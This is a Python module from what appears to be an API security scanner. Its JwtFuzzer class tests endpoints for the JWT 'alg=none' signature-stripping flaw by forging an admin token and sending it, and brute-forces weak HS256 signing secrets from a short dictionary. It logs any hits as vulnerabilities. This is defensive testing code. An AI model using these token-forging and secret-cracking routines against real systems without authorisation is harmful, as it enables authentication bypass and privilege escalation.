import logging
import asyncio
import base64
import json
from typing import Dict, Any, List

logger = logging.getLogger(__name__)

class JwtFuzzer:
    COMMON_SECRETS = ["secret", "123456", "password", "admin", "vampi", "secret123", "default"]

    @staticmethod
    def _b64url_decode(data: str) -> str:
        padded = data + '=' * (4 - len(data) % 4)
        return base64.urlsafe_b64decode(padded).decode('utf-8')

    @staticmethod
    def _b64url_encode(data: str) -> str:
        return base64.urlsafe_b64encode(data.encode('utf-8')).decode('utf-8').rstrip('=')

    @staticmethod
    async def run_jwt_tests(client, scan_id: int, base_url: str, endpoint: Dict[str, Any], token: str, repo) -> List[Dict]:
        vulns = []
        if not token:
            return vulns
            
        parts = token.split('.')
        if len(parts) != 3:
            return vulns
            
        header, payload, signature = parts
        method = endpoint["method"]
        path = endpoint["path"]
        
        # We only need to test JWT flaws once per endpoint where auth is required
        # Ideally, we should test an endpoint that we know requires auth (like /users/v1/admin or /users/v1/jerry)
        
        # Test 1: Signature Stripping (CVE-2015-9256 Algorithm None)
        try:
            h_json = json.loads(JwtFuzzer._b64url_decode(header))
            h_json['alg'] = 'none' # or None
            new_header = JwtFuzzer._b64url_encode(json.dumps(h_json))
            
            # The payload: let's try to elevate privileges by changing 'sub' or adding 'role'='admin'
            p_json = json.loads(JwtFuzzer._b64url_decode(payload))
            original_sub = p_json.get('sub', '')
            p_json['sub'] = 'admin' # Try to act as admin
            p_json['role'] = 'admin'
            new_payload = JwtFuzzer._b64url_encode(json.dumps(p_json))
            
            token_none = f"{new_header}.{new_payload}." # No signature
            
            headers = {"Authorization": f"Bearer {token_none}"}
            resp = await client.request(method, f"{base_url}{path}", headers=headers)
            
            if 200 <= resp.status_code < 300:
                logger.info(f"Scan {scan_id}: JWT ALG NONE BYPASS FOUND at {method} {path}")
                vuln_data = {
                    "vuln_type": "JWT Algorithm None Bypass (CVE-2015-9256)",
                    "endpoint": f"{method} {path}",
                    "description": "The API accepts JWT tokens with the 'alg' header set to 'none' and no signature, allowing full authentication bypass and privilege escalation.",
                    "severity": "Critical",
                    "evidence": f"Successfully accessed endpoint with tampered token: alg=none, sub=admin"
                }
                repo.add_vulnerability(scan_id, vuln_data)
                vulns.append(vuln_data)
                
        except Exception as e:
             # Decoding issues or request failures
             pass
             
        # Test 2: Weak Secret Brute Forcing (Offline)
        # We can implement a quick offline local brute-force if 'jwt' is available
        try:
            import jwt
            for secret in JwtFuzzer.COMMON_SECRETS:
                try:
                    # Attempt to decode the original valid token using the guessed secret
                    decoded = jwt.decode(token, secret, algorithms=["HS256"])
                    logger.info(f"Scan {scan_id}: CRITICAL: JWT SECRET CRACKED: {secret}")
                    vuln_data = {
                        "vuln_type": "Weak JWT Secret Detected",
                        "endpoint": "Global / Auth Infrastructure",
                        "description": f"The JWT signing secret was cracked using a common dictionary word. Secret is: '{secret}'. This allows attackers to forge any token.",
                        "severity": "Critical",
                        "evidence": f"Token successfully verified with offline secret: {secret}"
                    }
                    repo.add_vulnerability(scan_id, vuln_data)
                    vulns.append(vuln_data)
                    break # Stop if found
                except jwt.InvalidSignatureError:
                    continue # Wrong secret
                except Exception as e:
                    break # Usually means it's RS256 or something else we can't easily crack this way
        except ImportError:
            logger.warning("Scan: PyJWT not installed, skipping JWT brute-force test.")
            
        return vulns
